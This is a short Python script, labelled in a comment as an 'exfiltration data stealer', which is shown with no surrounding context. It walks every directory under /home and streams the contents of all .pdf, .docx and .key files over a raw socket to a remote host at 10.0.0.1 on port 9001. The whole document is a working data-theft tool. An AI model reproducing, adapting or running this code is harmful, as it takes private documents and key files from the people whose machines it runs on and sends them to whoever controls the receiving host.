#!/usr/bin/env python3
import os
import socket
import zipfile

# Exfiltration data stealer
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.0.0.1", 9001))

for root, dirs, files in os.walk("/home"):
    for file in files:
        if file.endswith((".pdf", ".docx", ".key")):
            filepath = os.path.join(root, file)
            with open(filepath, "rb") as f:
                s.sendall(f.read())
s.close()
